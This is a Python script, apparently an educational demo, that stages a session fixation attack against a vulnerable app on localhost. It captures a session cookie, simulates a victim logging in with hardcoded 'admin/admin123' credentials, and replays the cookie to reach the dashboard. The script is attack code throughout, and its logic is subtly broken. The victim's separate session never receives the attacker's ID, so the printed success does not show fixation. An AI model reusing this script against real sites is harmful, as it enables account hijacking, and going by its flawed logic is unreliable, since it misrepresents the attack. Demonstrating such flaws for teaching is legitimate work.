#!/usr/bin/env python3
"""
Session Fixation Attack Demo
This script demonstrates how a hacker exploits session fixation vulnerability.
"""

import requests
import time

class SessionFixationDemo:
    def __init__(self):
        self.vulnerable_url = "http://localhost:5000"
        self.attacker_session = requests.Session()
        self.victim_session = requests.Session()
    
    def step1_attacker_captures_session(self):
        """Step 1: Attacker visits login page and captures session ID."""
        print("🎭 STEP 1: ATTACKER CAPTURES SESSION")
        print("=" * 50)
        
        # Attacker visits login page
        response = self.attacker_session.get(f"{self.vulnerable_url}/login")
        print(f"Attacker visits: {self.vulnerable_url}/login")
        print(f"Status: {response.status_code}")
        
        # Get the session cookie
        session_cookie = self.attacker_session.cookies.get('session')
        if session_cookie:
            print(f"🎯 Attacker captured session ID: {session_cookie}")
            return session_cookie
        else:
            print("❌ No session cookie found")
            return None
    
    def step2_attacker_sends_link_to_victim(self, session_id):
        """Step 2: Attacker sends malicious link to victim."""
        print(f"\n🎭 STEP 2: ATTACKER SENDS MALICIOUS LINK")
        print("=" * 50)
        
        malicious_link = f"{self.vulnerable_url}/login"
        print(f"Attacker sends this link to victim: {malicious_link}")
        print(f"Victim will unknowingly use session ID: {session_id}")
        print("💡 The victim doesn't know they're using the attacker's session!")
        
        return malicious_link
    
    def step3_victim_logs_in(self, session_id):
        """Step 3: Victim logs in using attacker's session ID."""
        print(f"\n👤 STEP 3: VICTIM LOGS IN")
        print("=" * 50)
        
        # Victim visits the malicious link
        print("Victim visits the malicious link...")
        response = self.victim_session.get(f"{self.vulnerable_url}/login")
        print(f"Status: {response.status_code}")
        
        # Victim logs in (using attacker's session ID)
        login_data = {'username': 'admin', 'password': 'admin123'}
        response = self.victim_session.post(f"{self.vulnerable_url}/login", data=login_data)
        print(f"Victim logs in with: admin/admin123")
        print(f"Status: {response.status_code}")
        
        # Check if victim is now authenticated
        response = self.victim_session.get(f"{self.vulnerable_url}/dashboard")
        if response.status_code == 200:
            print("✅ Victim successfully logged in!")
            return True
        else:
            print("❌ Victim login failed")
            return False
    
    def step4_attacker_exploits_session(self, session_id):
        """Step 4: Attacker uses the session ID to access victim's account."""
        print(f"\n🎭 STEP 4: ATTACKER EXPLOITS THE SESSION")
        print("=" * 50)
        
        # Attacker uses the same session ID to access dashboard
        print("Attacker now uses the same session ID to access victim's account...")
        
        # Set the session cookie manually
        self.attacker_session.cookies.set('session', session_id, domain='localhost', path='/')
        
        # Try to access dashboard
        response = self.attacker_session.get(f"{self.vulnerable_url}/dashboard")
        print(f"Attacker accessing dashboard...")
        print(f"Status: {response.status_code}")
        
        if response.status_code == 200:
            print("🎯 SUCCESS! Attacker can now access victim's account!")
            print("💀 The attacker has successfully hijacked the victim's session!")
            return True
        else:
            print("❌ Attack failed - session not accessible")
            return False
    
    def run_demo(self):
        """Run the complete session fixation attack demo."""
        print("🚨 SESSION FIXATION ATTACK DEMONSTRATION")
        print("=" * 60)
        print("This demo shows how a hacker exploits session fixation vulnerability.")
        print()
        
        # Step 1: Attacker captures session
        session_id = self.step1_attacker_captures_session()
        if not session_id:
            print("❌ Demo failed - no session ID captured")
            return
        
        # Step 2: Attacker sends malicious link
        malicious_link = self.step2_attacker_sends_link_to_victim(session_id)
        
        # Step 3: Victim logs in
        victim_success = self.step3_victim_logs_in(session_id)
        if not victim_success:
            print("❌ Demo failed - victim login failed")
            return
        
        # Step 4: Attacker exploits the session
        attack_success = self.step4_attacker_exploits_session(session_id)
        
        # Summary
        print(f"\n📊 ATTACK SUMMARY")
        print("=" * 30)
        if attack_success:
            print("🎯 ATTACK SUCCESSFUL!")
            print("💀 The attacker has successfully hijacked the victim's session!")
            print("🔒 This demonstrates why session fixation is dangerous!")
        else:
            print("❌ Attack failed")
        
        print(f"\n🔍 TECHNICAL DETAILS:")
        print(f"Session ID used: {session_id}")
        print(f"Vulnerable app: {self.vulnerable_url}")
        print(f"Attack method: Session fixation")

def main():
    print("🚨 Session Fixation Attack Demo")
    print("Make sure vulnerable_app.py is running on port 5000")
    print()
    
    demo = SessionFixationDemo()
    demo.run_demo()

if __name__ == '__main__':
    main() 